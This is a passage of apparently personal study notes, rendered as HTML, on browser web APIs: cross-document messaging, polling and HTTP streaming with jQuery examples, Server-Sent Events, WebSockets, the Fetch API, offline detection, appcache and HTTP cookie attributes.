<ul><li>The ownership of these objects is given to the destination side and they are no longer usable on the sending side</li> <li>The <code>ArrayBuffer</code>, <code>MessagePort</code> and <code>ImageBitmap</code> types implement this interface</li></ul></li></ul></li> <li>The structured clone algorithm
<ul><li>defined by the HTML5 specification for copying complex JavaScript objects</li> <li>can avoid infinitely traversing cycles</li> <li><code>DATA_CLONE_ERR</code> exception
<ul><li><code>Error</code> and <code>Function</code> objects</li> <li><code>Symbol</code></li> <li>DOM nodes</li></ul></li> <li>Certain parameters of objects are not preserved:
<ul><li>The <code>lastIndex</code> field of <code>RegExp</code> objects is not preserved.</li> <li>Property descriptors, setters, and getters (as well as similar metadata-like features) are not duplicated. For example, if an object is marked read-only using a property descriptor, it will be read-write in the duplicate, since that's the default condition.</li> <li>The prototype chain does not get walked and duplicated</li></ul></li></ul></li> <li>handle the event: see <a href="#message-events">events</a></li> <li>schedules the <code>MessageEvent</code> to be dispatched only after all pending execution contexts have finished
<ul><li>For example, if <code>postMessage()</code> is invoked in an event handler, that event handler will run to completion, as will any remaining handlers for that same event, before the <code>MessageEvent</code> is dispatched</li></ul></li></ul></li> <li><p>document.domain：对于主域相同而子域不同的情况下，可以通过设置 document.domain 的办法来解决，具体做法是可以在 <code>http://www.example.com/a.html</code> 和 <code>http://sub.example.com/b.html</code> 两个文件分别加上 document.domain = &quot;a.com&quot;；然后通过 a.html 文件创建一个 iframe，去控制 iframe 的 window，从而进行交互，当然这种方法只能解决主域相同而二级域名不同的情况</p></li></ol> <h3 id="server-push"><a href="#server-push" class="header-anchor">#</a> Server Push</h3> <ol><li><p>short polling — where the browser sends a request to the server in regular intervals to see if there’s any data</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&quot;server&quot;</span><span class="token punctuation">,</span> <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token comment">//Update your dashboard gauge</span>
      salesGauge<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">//Setup the next poll recursively</span>
      <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li><p>long polling, aka. comet — flips short polling around: The page initiates a request to the server and the server holds that connection open until it has data to send</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&quot;server&quot;</span><span class="token punctuation">,</span> <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment">//Update your dashboard gauge</span>
    salesGauge<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">,</span> <span class="token literal-property property">complete</span><span class="token operator">:</span> poll<span class="token punctuation">,</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">30000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>Once the data is sent, the connection is closed by the browser and a new connection is immediately opened up to the server</li> <li>timeout problem</li> <li>the HTTP specification requiring browsers to limit simultaneous connections to two per hostname, the limitation is removed in 2014, but browsers still has the cap, higher than 2 though</li></ul></li> <li><p>HTTP streaming — use <code>Transfer Encoding: chunked</code> header to indicate data is sent in a series of chunks, originally used to indicate the <code>Content-Length</code> is uncertain and omitted</p> <ul><li>uses a single HTTP connection for the entire lifetime of the page</li> <li>The browser sends a request to the server and the server holds that connection open, periodically sending data through the connection to the server</li> <li>printing to the output buffer and then flushing (sending the contents of the output buffer to the client). This is the core of HTTP streaming</li> <li>client side: listening for the <code>readystatechange</code> event and focusing on <code>readyState</code> 3, keep track of the progress and slice the response</li></ul></li> <li><p><code>WebSocket</code> and server-sent events</p></li></ol> <h4 id="server-sent-events-sse"><a href="#server-sent-events-sse" class="header-anchor">#</a> Server-Sent Events (SSE)</h4> <ol><li><p><code>EventSource</code></p> <ul><li>no IE and Edge support</li> <li>instance opens a persistent connection to an HTTP server, which sends events in <code>text/event-stream</code> format (MIME type)
<ul><li>If the connection is closed, a reconnect is attempted</li> <li>The connection remains open until closed by calling <code>EventSource.close()</code></li></ul></li> <li>Once the connection is opened, incoming messages from the server are delivered to your code in the form of <a href="#message-events"><code>message</code></a> events</li> <li>unidirectional: from the server to the client</li> <li>constructor: <code>EventSource(url: string, EventSourceInitDict?: EventSourceInit)</code> <ul><li>EventSourceInit: <code>withCredentials</code> property defaults to <code>false</code></li></ul></li> <li>properties
<ul><li><code>EventSource.readyState</code> Read only — A number representing the state of the connection. Possible values are <code>EventSource.CONNECTING</code> (0), <code>OPEN</code> (1), or <code>CLOSED</code> (2)</li> <li><code>EventSource.url</code> Read only — A <code>DOMString</code> representing the URL of the source</li> <li><code>EventSource.withCredentials</code> Read only — A Boolean indicating whether the EventSource object was instantiated with cross-origin (CORS) credentials set (<code>true</code>), or not (<code>false</code>, the default)</li></ul></li> <li>Event handlers
<ul><li><code>EventSource.onerror</code> — interface is <code>Event</code>, not <code>UIEvent</code> nor <code>ProgressEvent</code></li> <li><code>EventSource.onmessage</code> — interface is <code>MessageEvent</code></li> <li><code>EventSource.onopen</code> — a connection with an event source is opened, interface is <code>Event</code></li></ul></li> <li>methods
<ul><li><code>EventSource.close()</code> — Closes the connection, if any, and sets the <code>readyState</code> attribute to <code>CLOSED</code>. If the connection is already closed, the method does nothing</li></ul></li></ul></li> <li><p>Event stream format (server side)</p> <ul><li>a simple stream of text data which must be encoded using UTF-8</li> <li>A colon as the first character of a line is in essence a comment, and is ignored
<ul><li>a server can send a comment periodically to keep the connection alive</li></ul></li> <li>Fields — Each message received has some combination of the following fields, one per line:<div class="language- extra-class"><pre class="language-text"><code>event: userconnect
data: {&quot;username&quot;: &quot;bobby&quot;, &quot;time&quot;: &quot;02:33:48&quot;}

data: Here's a system message of some kind that will get used
data: to accomplish some task.

event: usermessage
data: {&quot;username&quot;: &quot;bobby&quot;, &quot;time&quot;: &quot;02:34:11&quot;, &quot;text&quot;: &quot;Hi everyone.&quot;}
</code></pre></div><ul><li><code>event</code> — named custom event, an event will be dispatched on the browser to the listener for the specified event name
<ul><li>The <code>onmessage</code> handler is called if no event name is specified for a message</li></ul></li> <li><code>data</code> — The data field for the message. When the <code>EventSource</code> receives multiple consecutive lines that begin with <code>data:</code>, it will concatenate them, inserting a newline character between each one. Trailing newlines are removed
<ul><li>JSON or string</li></ul></li> <li><code>id</code> — The event ID to set the <code>EventSource</code> object's last event ID value
<ul><li>By setting an ID, the <code>EventSource</code> object keeps track of the last event fired</li> <li>If the connection is dropped, a special HTTP header called Last-Event-ID is sent along with the request so that the server can determine which event is appropriate to fire next</li></ul></li> <li><code>retry</code> — The reconnecting time to use when attempting to send the event. This must be an integer, specifying the reconnecting time in milliseconds. If a non-integer value is specified, the field is ignored</li> <li>All other field names are ignored</li> <li>If a line doesn't contain a colon, the entire line is treated as the field name with an empty value string</li></ul></li></ul></li></ol> <h4 id="web-sockets"><a href="#web-sockets" class="header-anchor">#</a> Web Sockets</h4> <ol><li><p><code>WebSocket</code></p> <ul><li>provide full-duplex, bidirectional communication with the server over a single, long-lasting connection
<ul><li>send messages to a server and receive event-driven responses without having to poll the server for a reply</li></ul></li> <li>smaller overhead than HTTP</li> <li>The same-origin policy does not apply to Web Sockets</li> <li>When a Web Socket is created in JavaScript, an HTTP request is sent to the server to initiate a connection. When the server responds, the connection uses HTTP upgrade to switch from HTTP to the Web Socket protocol
<ul><li><code>Connection: Upgrade</code>, <code>Upgrade: websocket</code></li> <li><code>101 Switching Protocols</code>, <code>Upgrade: websocket</code></li> <li>timeout problem — heartbeat messages called pings and pongs, one peer periodically sends a tiny packet to the other (the ping), and the other peer responds with a packet containing the same data (the pong)</li> <li>no limit on the number of open connections per hostname</li></ul></li> <li>constructor: <code>WebSocket(url, protocol?)</code> <ul><li>connection is established upon construct</li> <li>url example: <code>ws://localhost:8080</code>, <code>wss://localhost:8080</code> (secured)</li> <li>protocol defaults to <code>''</code></li></ul></li> <li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSocket#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>WebSocket.binaryType</code> — The binary data type used by the connection</li> <li><code>WebSocket.bufferedAmount</code> Read only — The number of bytes of queued data</li> <li><code>WebSocket.extensions</code> Read only — The extensions selected by the server</li> <li><code>WebSocket.protocol</code> Read only — The sub-protocol selected by the server</li> <li><code>WebSocket.readyState</code> Read only — The current state of the connection
<ul><li><code>WebSocket.OPENING</code> (0) — The connection is being established</li> <li><code>WebSocket.OPEN</code> (1) — The connection has been established</li> <li><code>WebSocket.CLOSING</code> (2) — The connection is beginning to close</li> <li><code>WebSocket.CLOSE</code> (3) — The connection is closed</li></ul></li> <li><code>WebSocket.url</code> Read only — The absolute URL of the WebSocket</li></ul></li> <li>handler properties
<ul><li><code>WebSocket.onclose</code> — An event listener to be called when the connection is closed
<ul><li><code>CloseEvent</code></li></ul></li> <li><code>WebSocket.onerror</code> — An event listener to be called when an error occurs
<ul><li>interface: <code>Event</code></li></ul></li> <li><code>WebSocket.onmessage</code> — An event listener to be called when a message is received from the server
<ul><li>see before <code>MessageEvent</code></li></ul></li> <li><code>WebSocket.onopen</code> — An event listener to be called when the connection is opened
<ul><li>interface: <code>Event</code></li></ul></li></ul></li> <li>Methods
<ul><li><code>WebSocket.close([code[, reason]])</code> — Closes the connection</li> <li><code>WebSocket.send(data)</code> — Enqueues data to be transmitted
<ul><li><code>data: USVString | Blob | ArrayBuffer | ArrayBufferView</code></li></ul></li></ul></li></ul></li> <li><p><code>CloseEvent</code> — <code>WebSocket.onclose</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/CloseEvent" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>properties
<ul><li><code>CloseEvent.code</code> Read only — Returns an unsigned short containing the close code send by the server</li> <li><code>CloseEvent.reason</code> Read only — Returns a <code>DOMString</code> indicating the reason the server closed the connection. This is specific to the particular server and sub-protocol</li> <li><code>CloseEvent.wasClean</code> Read only — Returns a Boolean that Indicates whether or not the connection was cleanly closed</li></ul></li></ul></li> <li><p>tools for web sockets</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API#Tools" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="fetch-api"><a href="#fetch-api" class="header-anchor">#</a> Fetch API</h3> <ol><li><p>Concepts and usage</p> <ul><li>At the heart of Fetch
<ul><li>are the Interface abstractions of HTTP <code>Request</code>s, <code>Response</code>s, <code>Headers</code>, and <code>Body</code> payloads, along with a global <code>fetch()</code> method for initiating asynchronous resource requests</li> <li>completely <code>Promise</code>-based</li></ul></li> <li>It will seem familiar to anyone who has used <code>XMLHttpRequest</code>, but the new API provides a more powerful and flexible feature set</li> <li>implemented in multiple interfaces, specifically <code>Window</code> and <code>WorkerGlobalScope</code></li></ul></li> <li><p><code>Window.fetch(input: string | Request, init?: RequestInit): Promise&lt;response&gt;</code><br> <code>WorkerGlobalScope.fetch()</code></p> <ul><li>parameters are identical to those of the <code>Request()</code> constructor</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>The Promise returned won’t reject on HTTP error status even if the response is an HTTP 404 or 500. Instead, it will resolve normally (with <code>ok</code> status set to <code>false</code>), and it will only reject on network failure or if anything prevented the request from completing, usually a permissions issue or similar</li></ul></li> <li><p>Aborting a fetch</p> <ul><li>experimental support for the <code>AbortController</code> and <code>AbortSignal</code></li></ul></li> <li><p><code>Request</code></p> <ul><li>represents a resource request, more likely to encounter a Request object being returned as the result of another API operation</li> <li>can be used for a parameter of <code>fetch()</code></li> <li>constructor: <code>Request(input, init?)</code></li> <li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Request#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li>methods
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Request#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li> <li><p><code>Headers</code></p> <ul><li>allows you to perform various actions on HTTP request and response headers
<ul><li>some headers can only be controlled by the user agent</li></ul></li> <li>guard
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Basic_concepts#Guard" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>affect some methods, for example, A <code>TypeError</code> is thrown if you try to modify a <code>Headers</code> object whose guard is <code>immutable</code></li></ul></li> <li>constructor: <code>Headers(init?)</code> <ul><li>init: simple object literal with <code>ByteString</code> values; or an existing <code>Headers</code> object</li> <li>retrieve: <code>Request.headers</code> and <code>Response.headers</code></li></ul></li> <li><code>IterableIterator</code> as well as <code>Headers.entries()</code> method</li> <li>methods
<ul><li>like other container type objects</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Headers#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li> <li><p><code>Response</code></p> <ul><li>constructor: <code>Response(body?, init?)</code></li> <li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Response#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li>methods
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Response#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li> <li><p><code>Body</code> mixin</p> <ul><li>represents the body of the response/request</li> <li>implemented by both <code>Request</code> and <code>Response</code></li> <li><code>Blob</code>, <code>BufferSource</code>, <code>FormData</code>, <code>URLSearchParams</code>, <code>USVString</code> or <code>ReadableStream</code></li> <li>properties and methods
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Body" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li></ol> <h2 id="offline-applications-and-client-side-storage"><a href="#offline-applications-and-client-side-storage" class="header-anchor">#</a> Offline Applications and Client-Side Storage</h2> <h3 id="offline-app"><a href="#offline-app" class="header-anchor">#</a> Offline App</h3> <ol><li><p>Offline detection</p> <ul><li><code>Navigator.onLine: boolean</code> <ul><li>results from  Chrome and Safari can be false positive</li></ul></li> <li>Network Events
<ul><li>interface: <code>Event</code></li> <li>event types
<ul><li><code>online</code> — The browser has gained access to the network</li> <li><code>offline</code> — The browser has lost access to the network</li></ul></li> <li>Bubbles — No</li> <li>Cancelable — No</li> <li>Target — DefaultView (<code>window</code>)</li> <li>Default Action — None</li></ul></li></ul></li> <li><p>application cache, or appcache</p> <ul><li>deprecated: Use Service Workers instead</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>The appcache is a cache area separate from the normal browser cache</li> <li>specify what should be stored in the page’s appcache by providing a manifest file listing the resources to download and cache<div class="language- extra-class"><pre class="language-text"><code>CACHE MANIFEST
# Comment
file.js
file.css
</code></pre></div>The manifest file is associated with a page by specifying its path in the attribute. The file must be served with a content type of <code>text/cache-manifest</code> to be used<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">manifest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/offline.manifest<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li><code>Window.applicationCache</code> <ul><li>events: <code>oncached</code>, <code>onchecking</code>, <code>ondownloading</code>, <code>onerror</code>, <code>onnoupdate</code>, <code>onobsolete</code>, <code>onprogress</code>, <code>onupdateready</code></li> <li><code>window.applicationCache.status</code></li> <li>methods</li></ul></li></ul></li></ol> <h4 id="service-worker"><a href="#service-worker" class="header-anchor">#</a> Service Worker</h4> <ol><li>Service Worker API
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="data-storage"><a href="#data-storage" class="header-anchor">#</a> Data Storage</h3> <h4 id="cookies"><a href="#cookies" class="header-anchor">#</a> Cookies</h4> <ol><li><p><code>Navigator.cookieEnabled</code> Read only</p></li> <li><p>HTTP cookies</p> <ul><li><code>Set-Cookie</code> <ul><li>When receiving an HTTP request, a server can send a Set-Cookie header with the response<div class="language- extra-class"><pre class="language-text"><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=chocolate
Set-Cookie: tasty_cookie=strawberry
</code></pre></div></li> <li>Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header<div class="language- extra-class"><pre class="language-text"><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div></li> <li><code>__Secure-</code> prefix: Cookies with a name starting with <code>__Secure-</code> (dash is part of the prefix) must be set with the <code>secure</code> flag and must be from a secure page (HTTPS).</li> <li><code>__Host-</code> prefix: Cookies with a name starting with <code>__Host-</code> must be set with the <code>secure</code> flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore aren't sent to subdomains) and the path must be &quot;/&quot;.</li> <li>subcookies: <code>name=name1=value1&amp;name2=value2&amp;name3=value3</code></li></ul></li> <li>persistence
<ul><li>Session cookies
<ul><li>default setting for cookies</li> <li>deleted when the client shuts down</li></ul></li> <li>Permanent cookies — expire at a specific date (<code>Expires</code>) or after a specific length of time in seconds (<code>Max-Age</code>)<div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><ul><li>the time and date set is relative to the client</li> <li><code>Max-Age</code> has precedence</li></ul></li></ul></li> <li>security flags<div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><ul><li><code>Secure</code>: HTTPS only</li> <li><code>HttpOnly</code>: cookies are inaccessible to JavaScript's <code>Document.cookie</code> API</li></ul></li> <li><code>SameSite</code> experimental: a cookie shouldn't be sent with cross-site requests
<ul><li><code>=Strict</code> — prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link</li> <li><code>=Lax</code> — only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks</li></ul></li> <li>Scope of cookies
<ul><li><code>Domain</code> — allowed hosts to receive the cookie
<ul><li>If unspecified, it defaults to the host of the current document location, excluding subdomains</li> <li>if specified, subdomains are always included</li> <li>a domain that does not include the origin server should be rejected by the user agent</li></ul></li> <li><code>Path</code> — indicates a URL path that must exist in the requested URL in order to send the <code>Cookie</code> header
<ul><li>for example: <code>Path=/docs</code></li> <li>only absolute paths, no <code>..</code> or <code>.</code></li></ul></li></ul></li></ul></li> <li><p><code>Document.cookie: string</code> — Read all cookies (URI encoded)</p> <ul><li>Write a new cookie — <code>document.cookie = 'key=value'</code> <ul><li>coordination: <code>encodeURIComponent()</code></li> <li>optional followed by attributes</li> <li><code>Date.toUTCString()</code> when setting <code>Expires</code></li></ul></li> <li>simple framework — <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>get<div class="language-javascript 